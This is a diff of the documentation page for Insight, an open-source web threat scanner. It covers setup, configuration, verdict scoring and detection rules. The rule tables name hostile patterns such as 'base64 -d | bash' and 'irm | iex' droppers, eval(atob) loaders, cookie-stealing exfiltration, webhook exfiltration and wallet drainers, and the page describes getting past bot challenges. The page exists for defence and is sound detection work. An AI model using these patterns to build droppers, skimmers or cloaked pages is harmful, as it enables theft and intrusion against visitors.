@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="Insight — open-source passive web threat scanner. Content-based detection of JavaScript threats, phishing, skimmers, and domain attacks. No reputation APIs required.">
+  <meta name="description" content="Insight — open-source passive web threat scanner. Content-based detection of JavaScript threats, phishing, skimmers, drainers and domain attacks, with a sandboxed browser renderer. No reputation APIs required.">
   <meta name="keywords" content="insight, web threat scanner, phishing detection, malicious javascript, open source, vault1337">
   <meta name="referrer" content="strict-origin-when-cross-origin">
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://cdn.jsdelivr.net 'unsafe-inline'; style-src 'self' https://cdn.jsdelivr.net 'unsafe-inline'; img-src 'self' https://img.shields.io data:; font-src https://cdn.jsdelivr.net; connect-src https://cdn.jsdelivr.net;">
@@ -47,7 +47,7 @@
     <p class="s-sub mb-1" style="color:var(--muted);">A Vault1337 companion tool</p>
     <img src="Images/insight-logo.png" alt="Insight | Web Threat Scanner" style="max-width:min(420px,70vw); width:100%; height:auto; margin-bottom:.5rem;">
     <p class="sub" style="max-width:600px; margin:0 auto 1.5rem;">
-      Open-source passive web threat scanner. Submit any URL — Insight fetches all public resources and analyses them entirely on content, with no reliance on reputation databases.
+      Open-source passive web threat scanner. Submit any URL — Insight fetches all public resources, renders the page in a sandboxed browser, and analyses everything on content alone, with no reliance on reputation databases.
     </p>
     <div class="cta">
       <a href="https://insight.vault1337.com" target="_blank" class="btn-v solid"><i class="bi bi-globe me-1"></i>Try It Live</a>
@@ -57,10 +57,11 @@
     <div class="callout" style="max-width:640px; margin:1.5rem auto 0; text-align:left;"><strong><i class="bi bi-lock-fill me-1"></i>Source temporarily private.</strong> The Insight GitHub repository has been made private until further notice. The <a href="https://insight.vault1337.com" target="_blank">live scanner</a> and this documentation remain available — any interest in source access should be made directly.</div>
     <div class="badge-row">
       <img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License">
-      <img src="https://img.shields.io/badge/Python-3.11-3776AB?logo=python&logoColor=white" alt="Python">
+      <img src="https://img.shields.io/badge/Python-3.12-3776AB?logo=python&logoColor=white" alt="Python">
       <img src="https://img.shields.io/badge/Django-5.2-092E20?logo=django&logoColor=white" alt="Django">
       <img src="https://img.shields.io/badge/React-19-61DAFB?logo=react&logoColor=black" alt="React">
       <img src="https://img.shields.io/badge/Celery-Redis-37814A?logo=celery&logoColor=white" alt="Celery">
+      <img src="https://img.shields.io/badge/Engine-2.1.53-7c3aed" alt="Detection engine version">
     </div>
   </div>
 </div>
@@ -92,6 +93,7 @@
         <li><a href="#verdict">Verdict &amp; Scoring</a></li>
         <li><a href="#js-analysis">JavaScript Analysis</a></li>
         <li><a href="#html-analysis">HTML Analysis</a></li>
+        <li><a href="#script-payloads">Script Payloads</a></li>
         <li><a href="#domain-intel">Domain Intelligence</a></li>
         <li><a href="#header-analysis">Header Analysis</a></li>
         <li><a href="#ssl-analysis">SSL Analysis</a></li>
@@ -99,10 +101,13 @@
 
         <li class="d-group">Carapace</li>
         <li><a href="#carapace">Visual Renderer</a></li>
+        <li><a href="#solve">Gate Solving</a></li>
         <li><a href="#carapace-findings">Renderer Findings</a></li>
 
         <li class="d-group">Reference</li>
         <li><a href="#api-ref">API Endpoints</a></li>
+        <li><a href="#vpn">VPN Egress</a></li>
+        <li><a href="#testing">Detection Testing</a></li>
         <li><a href="#stack">Tech Stack</a></li>
         <li><a href="#ack">Acknowledgements</a></li>
       </ul>
@@ -115,19 +120,22 @@
       <h2 id="getting-started"><i class="bi bi-radar me-2" style="color:var(--accent);"></i>Overview</h2>
       <p>
         Insight is a passive web threat scanner. Submit any URL and it fetches all public resources — HTML, scripts,
-        HTTP headers, and TLS certificates — then analyses them entirely on content. There are no calls to reputation
-        databases or external threat intelligence APIs.
+        HTTP headers, and TLS certificates — renders the page in a sandboxed browser, and analyses everything on
+        content alone. There are no calls to reputation databases or external threat intelligence APIs.
       </p>
       <p>
         Because detection is content-based, Insight catches zero-day campaigns, freshly registered phishing domains,
-        and newly injected skimmers that reputation feeds haven't yet indexed. It is a companion tool to
-        <a href="https://vault1337.com" target="_blank">vault1337.com</a> and shares the same design system.
+        and newly injected skimmers that reputation feeds have not yet indexed. Every finding for a known campaign
+        pattern names it — ClickFix, SocGholish, ClearFake, Magecart, drainers, TDS doorways, phishing kits — and
+        every finding carries the actual evidence (the code snippet, decoded payload, redirect chain or header value)
+        so an analyst can judge it without another tool.
       </p>
       <p>
-        The result of each scan is a prioritised findings report covering JavaScript threats, phishing indicators,
-        domain intelligence, security misconfigurations, and the full detected technology stack — each finding
-        categorised by severity (CRITICAL / HIGH / MEDIUM / LOW / INFO) with supporting evidence extracted directly
-        from the page content.
+        It is a companion tool to <a href="https://vault1337.com" target="_blank">vault1337.com</a> and shares the
+        same design system. The result of each scan is a prioritised findings report covering JavaScript threats,
+        phishing indicators, domain intelligence, security misconfigurations, and the full detected technology stack —
+        each finding categorised by severity (CRITICAL / HIGH / MEDIUM / LOW / INFO) with supporting evidence
+        extracted directly from the page content.
       </p>
       <div class="callout">
         <strong>Disclaimer:</strong> All scan results are provided for informational purposes only and must be
@@ -141,9 +149,10 @@
         <table class="v-table">
           <thead><tr><th>Requirement</th><th>Version</th><th>Notes</th></tr></thead>
           <tbody>
-            <tr><td>Python</td><td>3.11+</td><td>Global or virtual environment</td></tr>
+            <tr><td>Python</td><td>3.12+</td><td>Global or virtual environment</td></tr>
             <tr><td>Node.js</td><td>18+</td><td>For the frontend dev server</td></tr>
             <tr><td>Redis</td><td>7+</td><td>Required for Celery task queue — Docker is the easiest option</td></tr>
+            <tr><td>Carapace</td><td>optional</td><td>Screenshots, renderer findings and gate solving are skipped when unset</td></tr>
           </tbody>
         </table>
       </div>
@@ -218,6 +227,10 @@ python manage.py runserver</pre>
           <pre>celery -A insight worker -l info</pre>
         </div>
       </div>
+      <p style="color:var(--muted); font-size:.875rem;">
+        A Celery beat schedule also runs the nightly retention prune — old scans, failed scans, and scans left stranded
+        in <code>RUNNING</code> / <code>PENDING</code> — and, in production, periodic VPN exit rotation.
+      </p>
 
       <!-- ── Frontend ── -->
       <h2 id="frontend"><i class="bi bi-window me-2" style="color:var(--accent);"></i>4. Frontend</h2>
@@ -240,6 +253,7 @@ npm run dev</pre>
           <thead><tr><th>URL</th><th>Expected</th></tr></thead>
           <tbody>
             <tr><td><code>http://localhost:5173</code></td><td>React frontend — URL input and scan interface</td></tr>
+            <tr><td><code>http://localhost:5173/api-docs</code></td><td>Public API reference page</td></tr>
             <tr><td><code>http://localhost:8000/api/health/</code></td><td><code>{"status":"ok"}</code></td></tr>
             <tr><td><code>http://localhost:8000/api/schema/swagger-ui/</code></td><td>Interactive API documentation</td></tr>
           </tbody>
@@ -247,6 +261,7 @@ npm run dev</pre>
       </div>
 
       <h3>Run the test suite</h3>
+      <p>Django tests cover the application. Detection logic is covered separately by the three <a href="#testing">detection gates</a>.</p>
       <pre># All tests
 python manage.py test scanner
 
@@ -255,14 +270,14 @@ python manage.py test scanner.tests.test_validators</pre>
 
       <!-- ── Docker ── -->
       <h2 id="docker"><i class="bi bi-box-seam me-2" style="color:var(--accent);"></i>Docker (Alternative)</h2>
-      <p>If you prefer not to install Python and Node.js locally, the full stack can be started with Docker Compose.</p>
+      <p>If you prefer not to install Python and Node.js locally, the full development stack can be started with Docker Compose.</p>
 
       <div class="step">
         <div class="step-n">1</div>
         <div class="step-b">
           <h5>Configure and start</h5>
           <pre>cp .env.sample .env   # edit SECRET_KEY
-docker-compose up --build</pre>
+docker compose up --build</pre>
           <p>Frontend on <strong>:5173</strong>, backend on <strong>:8000</strong>.</p>
         </div>
       </div>
@@ -272,11 +287,16 @@ docker-compose up --build</pre>
         <div class="step-b">
           <h5>Teardown</h5>
           <pre># Stop and remove volumes
-docker-compose down -v
+docker compose down -v
 
 # Full clean (removes images too)
-docker-compose down --rmi all --volumes --remove-orphans</pre>
+docker compose down --rmi all --volumes --remove-orphans</pre>
         </div>
+      </div>
+      <div class="callout">
+        <strong>Production is a different file.</strong> <code>docker-compose.yml</code> is the development stack.
+        Production runs <code>docker-compose.prod.yml</code> only — nginx behind a Cloudflare tunnel, PostgreSQL,
+        Carapace, and the <a href="#vpn">VPN egress tunnels</a>.
       </div>
 
       <!-- ── Environment Variables ── -->
@@ -288,15 +308,28 @@ docker-compose down --rmi all --volumes --remove-orphans</pre>
           <tbody>
             <tr><td><code>SECRET_KEY</code></td><td><em>(insecure sample)</em></td><td>Must be changed — startup fails in production if unchanged</td></tr>
             <tr><td><code>DEBUG</code></td><td><code>True</code></td><td>Set <code>False</code> in production</td></tr>
-            <tr><td><code>REDIS_URL</code></td><td><code>redis://localhost:6379/0</code></td><td>Use <code>rediss://</code> (TLS) in production</td></tr>
+            <tr><td><code>ALLOWED_HOSTS</code></td><td><code>localhost,127.0.0.1</code></td><td>Add your domain — and the internal service name so container health checks pass</td></tr>
             <tr><td><code>DATABASE_URL</code></td><td><code>sqlite:///db.sqlite3</code></td><td>Use PostgreSQL in production</td></tr>
+            <tr><td><code>REDIS_URL</code></td><td><code>redis://localhost:6379/0</code></td><td>Startup warns when <code>DEBUG=False</code> and the URL is neither <code>rediss://</code> nor explicitly marked internal</td></tr>
             <tr><td><code>CORS_ALLOWED_ORIGINS</code></td><td><code>http://localhost:5173</code></td><td>Frontend origin</td></tr>
-            <tr><td><code>RATE_LIMIT_SCANS_PER_HOUR</code></td><td><code>5</code></td><td>Per IP address</td></tr>
             <tr><td><code>MAX_SCAN_RESOURCES</code></td><td><code>50</code></td><td>External scripts analysed per scan</td></tr>
-            <tr><td><code>SCAN_TIMEOUT_SECONDS</code></td><td><code>60</code></td><td>Hard Celery task time limit</td></tr>
-            <tr><td><code>CARAPACE_URL</code></td><td><em>(unset)</em></td><td>Base URL of the Carapace API, e.g. <code>http://carapace:8080</code>. Screenshots disabled if unset.</td></tr>
-            <tr><td><code>CARAPACE_API_KEY</code></td><td><em>(unset)</em></td><td>Optional API key sent in <code>X-Api-Key</code> header to Carapace</td></tr>
-            <tr><td><code>CARAPACE_SCREENSHOT_TIMEOUT</code></td><td><code>30</code></td><td>Per-request timeout in seconds for Carapace render calls</td></tr>
+            <tr><td><code>SCAN_TIMEOUT_SECONDS</code></td><td><code>120</code></td><td>Celery soft time limit per scan; the hard kill is this + 30s. <code>.env.sample</code> ships <code>60</code>.</td></tr>
+            <tr><td><code>RATE_LIMIT_SCANS_PER_MINUTE</code></td><td><code>20</code></td><td>Per-IP burst cap — the real anti-flood control. <code>0</code> disables.</td></tr>
+            <tr><td><code>MAX_CONCURRENT_SCANS_PER_IP</code></td><td><code>3</code></td><td>Simultaneous in-flight scans per IP — bounds worker and Chromium load. <code>0</code> disables.</td></tr>
+            <tr><td><code>CONCURRENT_SCAN_STALE_SECONDS</code></td><td><code>600</code></td><td>In-flight scans older than this stop counting toward the concurrency cap (crash self-heal)</td></tr>
+            <tr><td><code>RATE_LIMIT_SCANS_PER_HOUR</code></td><td><code>0</code> (off)</td><td>Legacy flat hourly quota. Left off — it throttles honest users and the public API without bounding the actual DoS vector.</td></tr>
+            <tr><td><code>SCAN_RETENTION_DAYS</code></td><td><code>90</code></td><td>Nightly prune of old scans; <code>0</code> disables</td></tr>
+            <tr><td><code>FAILED_SCAN_RETENTION_HOURS</code></td><td><code>24</code></td><td>Shorter window for <code>FAILED</code> scans, swept independently</td></tr>
+            <tr><td><code>STALE_SCAN_MINUTES</code></td><td><code>60</code></td><td>Scans stuck in <code>RUNNING</code> / <code>PENDING</code> longer than this are failed by the nightly prune</td></tr>
+            <tr><td><code>TRUSTED_PROXY_IP_HEADER</code></td><td><em>(unset)</em></td><td>Preferred way to recover the real client IP — name a header the proxy <em>overwrites</em> (nginx: <code>X-Real-IP</code>). Set only when the proxy is the sole ingress.</td></tr>
+            <tr><td><code>TRUSTED_PROXY_COUNT</code></td><td><code>0</code></td><td>Fallback: number of proxy hops that append to <code>X-Forwarded-For</code>. Never set higher than the hops you control.</td></tr>
+            <tr><td><code>CARAPACE_URL</code></td><td><em>(unset)</em></td><td>Base URL of the Carapace API, e.g. <code>http://carapace:8080</code>. Renderer phases are skipped if unset.</td></tr>
+            <tr><td><code>CARAPACE_API_KEY</code></td><td><em>(unset)</em></td><td>Sent as <code>X-API-Key</code> to Carapace</td></tr>
+            <tr><td><code>CARAPACE_SCREENSHOT_TIMEOUT</code></td><td><code>60</code></td><td>Per-request timeout for render calls — must sit above Carapace's own wall clock. <code>.env.sample</code> ships <code>15</code>.</td></tr>
+            <tr><td><code>CARAPACE_SOLVE_TIMEOUT</code></td><td><code>40</code></td><td>Per-request timeout for <code>/solve</code> — gate following and challenge clearing</td></tr>
+            <tr><td><code>CARAPACE_MOBILE_SCREENSHOT</code></td><td><code>false</code></td><td>Request a second 375&times;844 mobile capture alongside the desktop one</td></tr>
+            <tr><td><code>CARAPACE_RENDER_429_RETRIES</code></td><td><code>4</code></td><td>Retries when Carapace answers 429 (render gate saturated), backing off by <code>CARAPACE_RENDER_429_BACKOFF</code> (<code>2.0</code>)</td></tr>
+            <tr><td><code>GLUETUN_CONTROL_APIKEY</code></td><td><em>(unset)</em></td><td>Production only — authorises <a href="#vpn">VPN exit rotation</a></td></tr>
           </tbody>
         </table>
       </div>
@@ -305,21 +338,33 @@ docker-compose down --rmi all --volumes --remove-orphans</pre>
       <h2 id="detection"><i class="bi bi bi-question-circle me-2" style="color:var(--accent);"></i>How It Works</h2>
       <p>
         When a URL is submitted, Insight fetches the page and all linked external scripts using an SSRF-safe HTTP
-        fetcher. No external threat intelligence APIs are called — all analysis is performed against the raw content
-        returned by the target server.
+        fetcher — httpx over HTTP/2, with curl_cffi browser TLS-fingerprint impersonation for servers that refuse
+        ordinary clients. No external threat intelligence APIs are called; all analysis runs against the raw content
+        the target server returned and the DOM the renderer observed.
       </p>
-      <p>Five analysis modules run against every scan:</p>
+      <p>Static analysis modules run against every scan:</p>
       <ul>
-        <li><strong>JavaScript analyser</strong> — 59 checks against all scripts collected from the page</li>
-        <li><strong>HTML analyser</strong> — 33+ structural checks against the page markup</li>
-        <li><strong>Domain intelligence</strong> — 14 checks on the hostname and TLD</li>
+        <li><strong>JavaScript analyser</strong> — 80+ checks against every script collected from the page</li>
+        <li><strong>HTML analyser</strong> — 35+ structural checks against the page markup</li>
+        <li><strong>Domain intelligence</strong> — 13+ checks on the hostname, TLD and WHOIS record</li>
         <li><strong>Header analyser</strong> — 15 checks on HTTP response headers</li>
         <li><strong>SSL analyser</strong> — 6 checks on the TLS certificate</li>
+        <li><strong>Native script payload analyser</strong> — 4 checks for a response whose whole body is a PowerShell, batch, shell or VBScript program (see <a href="#script-payloads">Script Payloads</a>)</li>
+      </ul>
+      <p>Two dynamic phases run as well whenever <a href="#carapace">Carapace</a> is configured:</p>
+      <ul>
+        <li><strong>Render</strong> — the page is loaded in a confined headless Chromium so runtime-injected overlays exist to be seen, producing screenshots, renderer findings, JS-computed redirect destinations and an extended technology stack</li>
+        <li><strong>Gate solving</strong> — Cloudflare challenges and JavaScript cloaking gates are followed in that browser, so what gets analysed is the document the server <em>actually</em> serves (see <a href="#solve">Gate Solving</a>)</li>
       </ul>
       <p>
-        Each check emits zero or more findings. A context-collapse engine fires additional synthetic findings when
-        combinations of signals indicate coordinated attack infrastructure.
+        Each check emits zero or more findings. A context-collapse engine then fires additional synthetic findings when
+        combinations of individually weak signals indicate coordinated attack infrastructure.
       </p>
+      <div class="callout">
+        <strong>Engine version.</strong> Detection changes bump <code>backend/scanner/modules/version.txt</code>, which
+        is baked into the production image and busts the scan-result cache — so a re-scan after a detection change is a
+        fresh analysis, not a replayed verdict. This page documents <strong>2.1.53</strong>.
+      </div>
 
       <!-- ── Verdict ── -->
       <h2 id="verdict"><i class="bi bi-flag me-2" style="color:var(--accent);"></i>Verdict &amp; Scoring</h2>
@@ -330,23 +375,40 @@ docker-compose down --rmi all --volumes --remove-orphans</pre>
           <thead><tr><th>Verdict</th><th>Condition</th></tr></thead>
           <tbody>
             <tr><td><strong style="color:#f87171;">MALICIOUS</strong></td><td>Any CRITICAL finding</td></tr>
-            <tr><td><strong style="color:#fb923c;">SUSPICIOUS</strong></td><td>Any HIGH finding, or 2+ MEDIUM findings</td></tr>
-            <tr><td><strong style="color:#4ade80;">CLEAN</strong></td><td>Only LOW and INFO findings</td></tr>
-            <tr><td><strong style="color:var(--muted);">UNKNOWN</strong></td><td>No findings at all</td></tr>
+            <tr><td><strong style="color:#fb923c;">SUSPICIOUS</strong></td><td>Any HIGH finding, or 2+ MEDIUM findings <em>of distinct signal classes</em></td></tr>
+            <tr><td><strong style="color:#4ade80;">CLEAN</strong></td><td>Only LOW and INFO findings, <strong>and</strong> the page content was actually read</td></tr>
+            <tr><td><strong style="color:var(--muted);">UNKNOWN</strong></td><td>No findings at all, or the content could not be read — an unsolvable bot challenge, or a cloaking gate that could not be followed and has not been seen before</td></tr>
           </tbody>
         </table>
       </div>
+      <p style="color:var(--muted); font-size:.875rem;">
+        <strong style="color:var(--text);">CLEAN is a positive claim</strong> — "we looked at this page and it does not
+        endanger a visitor" — so it is never given for content the scanner never saw. A scan that received only a
+        challenge page degrades to UNKNOWN instead of passing. Findings that did fire on that challenge page still stand.
+      </p>
+      <p style="color:var(--muted); font-size:.875rem;">
+        <strong style="color:var(--text);">MEDIUM signal classes.</strong> The "2+ MEDIUM" rule assumes the signals are
+        independent. Several MEDIUMs of the same kind are one observation reported repeatedly, so MEDIUMs are counted by
+        signal <em>class</em> — every obfuscation-family finding (packed JavaScript, hex-encoded string, high-entropy
+        string) collapses into one. Context-only MEDIUMs, such as a Web3 signing flow or a runtime-generated beacon
+        domain, describe behaviour that is identical whether the page is honest or hostile: they carry no suspicion on
+        their own and never reach a verdict by themselves. Escalation for those runs through context collapse instead.
+      </p>
 
       <h3>Context collapse rules</h3>
-      <p>Synthetic findings are generated when multiple signals combine to indicate a coordinated attack pattern:</p>
+      <p>37 correlation rules fire synthetic findings when multiple signals combine into coordinated attack infrastructure:</p>
       <ul>
-        <li>High-risk TLD + external form action + missing security headers &rarr; <strong>HIGH</strong> "phishing infrastructure"</li>
+        <li>High-risk TLD + external form action &rarr; <strong>HIGH</strong> "phishing infrastructure" — <strong>CRITICAL</strong> when a DGA signal is present too</li>
         <li>DGA domain + hidden iframe + obfuscated JS &rarr; <strong>CRITICAL</strong> "drive-by malware delivery"</li>
-        <li>Brand impersonation + phishing form (± new certificate) &rarr; <strong>CRITICAL</strong> "active phishing campaign"</li>
+        <li>Brand impersonation + phishing form (&plusmn; new certificate) &rarr; <strong>CRITICAL</strong> "active phishing campaign"</li>
         <li>Keylogger / skimmer + DevTools evasion &rarr; <strong>CRITICAL</strong> "sophisticated targeted malware"</li>
-        <li>Fake CAPTCHA / ClickFix UI + clipboard write &rarr; <strong>CRITICAL</strong> "ClickFix malware delivery"</li>
+        <li>Fake CAPTCHA / ClickFix UI + autonomous clipboard write &rarr; <strong>CRITICAL</strong> "ClickFix malware delivery"</li>
         <li>Injected unknown external script + ClickFix / clipboard payload &rarr; <strong>CRITICAL</strong> "compromised site delivering ClickFix malware"</li>
-        <li>Newly registered domain (&le; 30 days) + high-risk TLD &rarr; <strong>HIGH</strong> "newly registered high-risk domain" — purpose-built attack infrastructure signal</li>
+        <li>EtherHiding on-chain payload retrieval + ClickFix overlay &rarr; <strong>CRITICAL</strong> — the ClearFake chain</li>
+        <li>Wallet signing flow + impersonation or typosquat infrastructure &rarr; <strong>CRITICAL</strong> "drainer"</li>
+        <li>JavaScript execution gate + renderer-observed third-party destination &rarr; <strong>HIGH</strong> "cloaked doorway — TDS"</li>
+        <li>Newly registered domain (&le; 30 days) + high-risk TLD &rarr; <strong>HIGH</strong> "newly registered high-risk domain"</li>
+        <li>Runtime-generated beacon domain + exfiltration or disposable infrastructure &rarr; <strong>CRITICAL</strong> "exfiltration to a runtime-generated destination"</li>
       </ul>
 
       <!-- ── JS Analysis ── -->
@@ -354,7 +416,8 @@ docker-compose down --rmi all --volumes --remove-orphans</pre>
       <p>
         All scripts are run through jsbeautifier before analysis (files &le; 256 KB). Both the original and
         beautified forms are checked. Base64-encoded strings are decoded and the plaintext payload is appended
-        to the evidence block where printable.
+        to the evidence block where printable. Bundles above 600 KB are routed through targeted full-file
+        coverage rather than the full ladder, so a large minified bundle cannot hide a payload by size alone.
       </p>
 
       <h3 class="mt-3 mb-2" style="font-size:1rem; color:var(--accent);">CRITICAL</h3>
@@ -363,19 +426,25 @@ docker-compose down --rmi all --volumes --remove-orphans</pre>
           <thead><tr><th>Check</th><th>Pattern</th></tr></thead>
           <tbody>
             <tr><td>Encoded payload execution</td><td><code>eval(atob(...))</code>, <code>eval(unescape(...))</code>, <code>eval(decodeURIComponent(...))</code> chains</td></tr>
+            <tr><td>Remote code execution</td><td><code>fetch()</code> + <code>.then()</code> / <code>await</code> + <code>eval()</code> / <code>new Function()</code> in the same async chain — the compromised WordPress staging pattern</td></tr>
+            <tr><td>Decrypt-then-execute</td><td><code>crypto.subtle.decrypt</code> / <code>importKey</code> + <code>eval()</code> / <code>new Function()</code> — encrypted payload executed at runtime</td></tr>
+            <tr><td>ChaCha20 payload</td><td>ChaCha20 stream-cipher implementation decrypting a DOM-stored ciphertext — ClickFix terminal commands held as ciphertext in the page</td></tr>
+            <tr><td>Blockchain C2 loader</td><td>ethers.js + on-chain read + <code>eval(atob(...))</code> — ClearFake / EtherHiding: the payload lives in a smart contract, not on a takedown-able host</td></tr>
             <tr><td>Session theft</td><td>Cookie / localStorage read + outbound <code>fetch</code> / XHR / <code>sendBeacon</code></td></tr>
             <tr><td>Credential harvester</td><td>Form submit hijack + external <code>fetch</code> / <code>sendBeacon</code> + <code>preventDefault</code></td></tr>
             <tr><td>Keylogger</td><td><code>keydown</code> / <code>keyup</code> listener reading <code>event.key</code> + outbound network call</td></tr>
             <tr><td>Magecart skimmer</td><td>DOM query targeting card / CVV fields + exfiltration + encoding or polling</td></tr>
+            <tr><td>Magecart activation gate</td><td><code>location.href.includes('checkout')</code> — a skimmer that only arms on checkout pages, to evade homepage-only scanners</td></tr>
+            <tr><td>MutationObserver skimmer</td><td><code>MutationObserver</code> watching for dynamically injected card fields — the SPA checkout case</td></tr>
             <tr><td>Crypto miner</td><td>Stratum protocol strings, CoinHive / CryptoLoot names, WebWorker + WASM pattern</td></tr>
             <tr><td>Unix shell dropper</td><td><code>base64 -d | bash</code> pattern embedded in JS strings</td></tr>
             <tr><td>PowerShell dropper</td><td><code>irm ... | iex</code> / <code>Invoke-RestMethod ... | iex</code> embedded in JS strings</td></tr>
             <tr><td>HTML smuggling</td><td><code>new Blob([...])</code> + <code>URL.createObjectURL</code> + auto-download trigger</td></tr>
-            <tr><td>Web3 wallet drainer</td><td><code>window.ethereum</code> + <code>eth_sendTransaction</code> / <code>eth_signTypedData</code> / <code>personal_sign</code></td></tr>
-            <tr><td>Malicious service worker</td><td><code>navigator.serviceWorker.register()</code> from <code>blob:</code> or <code>data:</code> URI</td></tr>
-            <tr><td>Remote code execution</td><td><code>fetch()</code> + <code>.then()</code> / <code>await</code> + <code>eval()</code> / <code>new Function()</code> in same async chain — compromised WordPress pattern</td></tr>
-            <tr><td>Decrypt-then-execute</td><td><code>crypto.subtle.decrypt</code> / <code>importKey</code> + <code>eval()</code> / <code>new Function()</code> — encrypted payload executed at runtime</td></tr>
-            <tr><td>ClickFix clipboard payload</td><td><code>navigator.clipboard.writeText()</code> argument contains shell command indicators (PowerShell, mshta, cmd.exe, <code>| bash</code>, etc.) — content-based detection regardless of click handler</td></tr>
+            <tr><td>Web3 wallet drainer</td><td>Inferno / Angel Drainer patterns — <code>window.ethereum</code> + <code>eth_sendTransaction</code> / <code>eth_signTypedData</code> / <code>personal_sign</code></td></tr>
+            <tr><td>Drainer configuration</td><td>Drainer-kit config keys in page script (<code>minimalDrainValue</code>, <code>logDrainingStrategy</code>)</td></tr>
+            <tr><td>Malicious service worker</td><td><code>navigator.serviceWorker.register()</code> from a <code>blob:</code> or <code>data:</code> URI</td></tr>
+            <tr><td>AppleScript infostealer</td><td><code>do shell script</code> + keychain / credential APIs — macOS ClickFix payloads (Atomic Stealer, Poseidon)</td></tr>
+            <tr><td>ClickFix clipboard payload</td><td><code>navigator.clipboard.writeText()</code> argument contains shell command indicators (PowerShell, mshta, cmd.exe, <code>| bash</code>, …) — content-based, regardless of the click handler</td></tr>
           </tbody>
         </table>
       </div>
@@ -387,17 +456,27 @@ docker-compose down --rmi all --volumes --remove-orphans</pre>
           <tbody>
             <tr><td>Obfuscator.io fingerprint</td><td><code>_0x</code> array-rotation variable pattern</td></tr>
             <tr><td>Character-code obfuscation</td><td><code>String.fromCharCode(...)</code> building strings character by character</td></tr>
+            <tr><td>JSFuck / JSFireTruck</td><td>Code written entirely in <code>[]()!+</code> symbol soup</td></tr>
+            <tr><td>JJEncode</td><td>The <code>$=~[]</code> self-decoding preamble</td></tr>
+            <tr><td>XOR charcode array</td><td>Charcode array XORed against a key, or hex-string XOR, then executed — hand-rolled packers that no public deobfuscator matches</td></tr>
             <tr><td>High entropy string</td><td>Shannon entropy &gt; 5.5 bits/char on literals &gt; 64 chars</td></tr>
+            <tr><td>Decode density</td><td>Concentration of decode primitives per KB — catches packers that individually look ordinary</td></tr>
+            <tr><td>NDSW / Balada Injector</td><td><code>if(nds[wxyz] === undefined)</code> sentinel — the single most common WordPress compromise vector per Sucuri's 2024 report</td></tr>
             <tr><td>Dynamic hidden iframe</td><td><code>createElement('iframe')</code> + <code>display:none</code> / <code>width:0</code></td></tr>
             <tr><td>Forced download</td><td><code>createElement('a')</code> + <code>.download</code> + <code>.click()</code></td></tr>
-            <tr><td>Beacon exfiltration</td><td><code>navigator.sendBeacon()</code> to external domain</td></tr>
+            <tr><td>Beacon exfiltration</td><td><code>navigator.sendBeacon()</code> to an external domain</td></tr>
             <tr><td>Clipboard hijack</td><td><code>navigator.clipboard.writeText()</code> outside a recognisable click handler</td></tr>
-            <tr><td>Script injection</td><td><code>document.write()</code> injecting external <code>&lt;script src="https://..."&gt;</code></td></tr>
+            <tr><td>Script injection</td><td><code>document.write()</code> injecting an external <code>&lt;script src="https://..."&gt;</code></td></tr>
             <tr><td>Shell string</td><td><code>bash -c</code> execution string embedded in JS</td></tr>
-            <tr><td>C2 infrastructure</td><td><code>curl</code> / <code>wget</code> to bare IP address</td></tr>
+            <tr><td>C2 infrastructure</td><td><code>curl</code> / <code>wget</code> to a bare IP address</td></tr>
             <tr><td>External service worker</td><td><code>serviceWorker.register()</code> loading from an external domain</td></tr>
             <tr><td>Living off Trusted Sites (LoTS)</td><td>Exfiltration via Telegram Bot API, Discord webhook, Slack webhook, Google Apps Script, Webhook.site, Pipedream, RequestBin, Pastebin API</td></tr>
             <tr><td>Dynamic module import</td><td><code>import('https://...')</code> loading an ES module from an unknown external URL</td></tr>
+            <tr><td>WebRTC IP leak</td><td><code>RTCPeerConnection</code> + <code>onicecandidate</code> exposing a visitor's real IP behind a VPN — drainer and TDS reconnaissance</td></tr>
+            <tr><td>Geofencing evasion</td><td>Client-side geoIP API call routing researchers to a decoy and victims to the payload</td></tr>
+            <tr><td>Anti-bot gate</td><td><code>antibot.php</code> / <code>antibot_run_light()</code> phishing-kit gateways, reCAPTCHA-gated external redirects</td></tr>
+            <tr><td>Browser lock</td><td><code>navigator.keyboard.lock()</code>, forced fullscreen trapping, pointer lock — the tech-support scam pattern</td></tr>
+            <tr><td>Webdriver probe (gated)</td><td><code>navigator.webdriver</code> read that <em>gates</em> a redirect, DOM rewrite, script injection or fetch — an ungated read is LOW, because that is ordinary bot-detection SDK behaviour</td></tr>
           </tbody>
         </table>
       </div>
@@ -412,8 +491,15 @@ docker-compose down --rmi all --volumes --remove-orphans</pre>
             <tr><td>Auto-redirect</td><td><code>window.location</code> inside <code>setTimeout</code> &lt; 3000ms</td></tr>
             <tr><td>Right-click disable</td><td><code>contextmenu</code> event + <code>preventDefault()</code></td></tr>
             <tr><td>DevTools detection</td><td><code>outerWidth</code> / <code>outerHeight</code> delta, <code>__REACT_DEVTOOLS_GLOBAL_HOOK__</code>, console timing tricks</td></tr>
+            <tr><td>Runtime-generated beacon domain</td><td>A page that computes its beacon host instead of containing it — identical behaviour for malware C2 and for ad-tech dodging filter lists, so it is reported as context, never a verdict on its own</td></tr>
+            <tr><td>Web3 signing flow</td><td>Wallet transaction / signing request — context only, because Uniswap and a drainer issue the same request; escalation runs through context collapse</td></tr>
           </tbody>
         </table>
+      </div>
+      <div class="callout">
+        <strong>Word-boundary matching.</strong> Obfuscation tokens are matched as whole words throughout the ladder.
+        Substring matching was the single largest source of false positives — a legitimate minified bundle contains
+        plenty of byte sequences that look like a packer fragment if you do not require a boundary.
       </div>
 
       <!-- ── HTML Analysis ── -->
@@ -423,60 +509,111 @@ docker-compose down --rmi all --volumes --remove-orphans</pre>
           <thead><tr><th>Severity</th><th>Check</th></tr></thead>
           <tbody>
             <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>Phishing form: <code>action</code> domain &ne; page domain + brand keyword in page title</td></tr>
-            <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>Shell command (PowerShell, mshta, cmd, iex) embedded in HTML <code>data-*</code> attribute or event handler — ClickFix payload storage pattern</td></tr>
-            <tr><td><span style="color:#f87171;">CRITICAL</span></td><td>Shell command embedded in hidden HTML element (<code>display:none</code>, hidden input, <code>&lt;template&gt;</code>) — ClickFix payload storage pattern</td></tr>
